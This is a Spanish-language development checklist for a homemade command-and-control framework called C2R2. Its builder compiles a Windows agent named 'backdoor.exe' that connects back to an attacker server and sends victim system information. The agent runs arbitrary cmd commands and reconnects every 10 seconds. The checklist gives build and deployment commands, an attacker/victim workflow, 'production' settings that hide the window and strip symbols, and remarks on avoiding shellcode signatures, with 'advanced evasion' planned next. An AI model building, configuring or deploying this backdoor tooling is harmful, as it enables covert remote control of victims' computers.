# ✅ CHECKLIST DE VERIFICACIÓN - C2R2 v2.0

## 🔍 Revisión de Código

### 1. Builder (`builder/src/`)

#### `main.rs`
- ✅ CLI eliminado parámetro `shellcode`
- ✅ Ahora solo requiere `--name` y `--server`
- ✅ Llama a `generate_agent()` con 2 parámetros

#### `encrypt.rs`
- ✅ Eliminadas funciones de encriptación AES
- ✅ Solo genera `config.rs` con `C2_SERVER`
- ✅ Compila con `--target x86_64-pc-windows-gnu`
- ✅ Path correcto: `agent/target/x86_64-pc-windows-gnu/release/agent.exe`

#### `Cargo.toml`
- ✅ Dependencias reducidas a solo `clap`
- ✅ Eliminadas: `aes`, `cbc`, `rand`, `winapi`, etc.

---

### 2. Agent (`agent/src/`)

#### `main.rs`
- ✅ Eliminado código de desencriptación AES
- ✅ Eliminado código de VirtualAlloc/CreateThread
- ✅ Conexión directa con `TcpStream::connect()`
- ✅ Loop de reconexión automática (cada 10s)
- ✅ Thread separado para envío de sysinfo
- ✅ Keep-alive: responde a "ping" con "pong"
- ✅ Ejecución de comandos con `Command::new("cmd")`
- ✅ Delimitador `\n<<END>>\n` para respuestas

#### `config.rs` (generado)
- ✅ Solo contiene: `pub const C2_SERVER: &str = "...";`
- ✅ No hay KEY, IV, ENCRYPTED_SHELLCODE

#### `Cargo.toml`
- ✅ Sin dependencias (stdlib pura)
- ✅ Eliminadas: `aes`, `cbc`, `winapi`
- ✅ Profile release configurado (lto, panic=abort)

---

### 3. Server (`c2r2-server/src/`)

#### Compatibilidad
- ✅ Ya está preparado para recibir mensajes `__SYSINFO__`
- ✅ Ya implementa keep-alive ping/pong
- ✅ Ya maneja delimitador `\n<<END>>\n`
- ✅ **NO requiere cambios** ✨

---

## 🏗️ Compilación Cross-Platform

### Desde Kali Linux (recomendado):

```bash
# 1. Instalar dependencias
sudo apt update
sudo apt install mingw-w64 gcc-mingw-w64-x86-64

# 2. Agregar target de Rust
rustup target add x86_64-pc-windows-gnu

# 3. Compilar builder
cd C2R2
cargo build --release

# 4. Generar agente
./target/release/builder --name payload --server "10.0.0.5:4444"

# Resultado: payload.exe (Windows executable)
```

### Desde Windows (alternativo):

```powershell
# 1. Instalar rustup (si no está)
# https://rustup.rs/

# 2. Agregar target
rustup target add x86_64-pc-windows-gnu

# 3. Instalar mingw-w64
# Descargar de: https://www.mingw-w64.org/
# O usar: winget install mingw

# 4. Compilar builder
cd C2R2
cargo build --release

# 5. Generar agente
.\target\release\builder.exe --name payload --server "10.0.0.5:4444"
```

---

## 🧪 Testing Workflow

### 1. En Kali (Atacante):

```bash
# Terminal 1: Iniciar servidor C2
cd C2R2
cargo run --release --manifest-path c2r2-server/Cargo.toml

# Terminal 2: Generar agente
./target/release/builder --name test --server "192.168.1.100:4444"
# Resultado: test.exe
```

### 2. En Windows (Víctima):

```cmd
# Transferir test.exe
# Ejecutar:
test.exe

# Deberías ver (si console está habilitada):
DEBUG: C2R2 Agent v2.0 - Direct Connection
DEBUG: Conectando a 192.168.1.100:4444
DEBUG: Conectado al servidor C2
```

### 3. En Kali (Verificar):

```bash
# En el servidor deberías ver:
[+] Nuevo cliente conectado: <UUID>
__SYSINFO__:hostname:DESKTOP-XXX
__SYSINFO__:username:victim
__SYSINFO__:os:Windows 10
__SYSINFO__:privileges:User

# Interactuar:
> /list
> /select 1
> /cmd whoami
```

---

## 🔐 Configuración para Producción

### `agent/src/main.rs`

**Cambiar línea 1:**
```rust
// Debug (para testing):
#![windows_subsystem = "console"]

// Producción (sin ventana):
#![windows_subsystem = "windows"]
```

### `agent/Cargo.toml`

**Descomentar línea 16:**
```toml
[profile.release]
panic = "abort"
lto = true
codegen-units = 1
strip = true  # ← Descomentar para eliminar símbolos de debug
```

---

## 🎯 Flujo Completo de Trabajo

```
┌─────────────────────────────────────────────────────────────┐
│ ATACANTE (Kali Linux)                                       │
├─────────────────────────────────────────────────────────────┤
│ 1. cargo build --release                                    │
│    └─> Compila builder                                      │
│                                                              │
│ 2. ./target/release/builder --name backdoor \               │
│    --server "192.168.1.100:4444"                            │
│    ├─> Genera agent/src/config.rs                           │
│    ├─> Compila agent para Windows (mingw-w64)               │
│    └─> Copia a backdoor.exe                                 │
│                                                              │
│ 3. cargo run --manifest-path c2r2-server/Cargo.toml         │
│    └─> Inicia servidor Tokio en puerto 4444                 │
└─────────────────────────────────────────────────────────────┘
                            │
                            │ (Transferir backdoor.exe)
                            ▼
┌─────────────────────────────────────────────────────────────┐
│ VÍCTIMA (Windows)                                           │
├─────────────────────────────────────────────────────────────┤
│ 1. backdoor.exe ejecutado                                   │
│    ├─> Lee config::C2_SERVER                                │
│    ├─> TcpStream::connect("192.168.1.100:4444")            │
│    └─> Envía __SYSINFO__ gradualmente                       │
│                                                              │
│ 2. Loop infinito:                                           │
│    ├─> Espera comandos del servidor                         │
│    ├─> Ejecuta: Command::new("cmd").args(&["/C", cmd])     │
│    ├─> Envía output con delimitador                         │
│    └─> Responde a keep-alive ping/pong                      │
│                                                              │
│ 3. Si se desconecta:                                        │
│    └─> Reintenta conexión cada 10s                          │
└─────────────────────────────────────────────────────────────┘
```

---

## 🐛 Problemas Potenciales y Soluciones

### Problema 1: "can't find crate for `std`"
**Causa**: Target no instalado  
**Solución**:
```bash
rustup target add x86_64-pc-windows-gnu
```

### Problema 2: "linker `x86_64-w64-mingw32-gcc` not found"
**Causa**: mingw-w64 no instalado  
**Solución**:
```bash
sudo apt install mingw-w64
```

### Problema 3: "agent.exe no se genera"
**Causa**: Path incorrecto en encrypt.rs  
**Solución**: Verificar que sea `agent/target/x86_64-pc-windows-gnu/release/agent.exe`

### Problema 4: "Servidor no recibe conexión"
**Causa**: Firewall bloqueando puerto 4444  
**Solución**:
```bash
# Linux
sudo ufw allow 4444/tcp

# Windows
netsh advfirewall firewall add rule name="C2R2" dir=in action=allow protocol=TCP localport=4444
```

### Problema 5: "Agent se desconecta inmediatamente"
**Causa**: Server IP incorrecta en config.rs  
**Solución**: Verificar IP con `ip a` en Kali

---

## 📊 Verificación de Archivos Generados

### Estructura Esperada:
```
C2R2/
├── builder/
│   ├── src/
│   │   ├── main.rs        ← CLI sin parámetro shellcode
│   │   └── encrypt.rs     ← Solo genera config, sin AES
│   └── Cargo.toml         ← Solo dependencia: clap
├── agent/
│   ├── src/
│   │   ├── main.rs        ← TcpStream directo, sin shellcode
│   │   └── config.rs      ← GENERADO: solo C2_SERVER
│   └── Cargo.toml         ← Sin dependencias
├── c2r2-server/
│   ├── src/
│   │   └── main.rs        ← Sin cambios necesarios
│   └── Cargo.toml
├── target/
│   └── release/
│       └── builder        ← Ejecutable del builder
├── backdoor.exe           ← GENERADO: agente para Windows
└── DIRECT_CONNECTION.md   ← Esta documentación
```

---

## ✅ Checklist Final

Antes de probar en producción, verifica:

- [ ] `agent/src/main.rs` usa `#![windows_subsystem = "windows"]`
- [ ] `agent/Cargo.toml` tiene `strip = true` descomentado
- [ ] `builder/src/encrypt.rs` compila con target `x86_64-pc-windows-gnu`
- [ ] `rustup target list | grep windows-gnu` muestra "(installed)"
- [ ] `which x86_64-w64-mingw32-gcc` devuelve un path válido
- [ ] Servidor C2 está escuchando en el puerto correcto
- [ ] Firewall permite conexiones entrantes en puerto C2
- [ ] IP del servidor es accesible desde la víctima

---

## 🎓 Diferencias Clave vs Shellcode

| Aspecto | v1.0 (Shellcode) | v2.0 (Directo) |
|---------|------------------|----------------|
| **Dependencias** | aes, cbc, winapi | NINGUNA |
| **Tamaño** | ~200KB | ~60KB |
| **Complejidad** | Alta | Baja |
| **Detección** | Firmas de shellcode | Código legítimo |
| **Mantenibilidad** | Difícil | Fácil |
| **msfvenom** | Requerido | No necesario |
| **VirtualAlloc** | Sí (RWX) | No |
| **Inyección** | Sí | No |

---

## 🚀 Próximos Pasos

1. ✅ Compilar builder en Kali
2. ✅ Generar agente con IP real
3. ✅ Iniciar servidor C2
4. ✅ Transferir agente a Windows
5. ✅ Ejecutar y verificar conexión
6. ✅ Probar comandos: `/list`, `/select`, `/cmd`
7. 🔜 Implementar evasión avanzada (v2.1)

---

**Resultado Esperado**: Un agente Windows completamente funcional que se conecta directamente al servidor Tokio sin usar shellcode, msfvenom, o Metasploit.

**Estado**: ✅ LISTO PARA TESTING
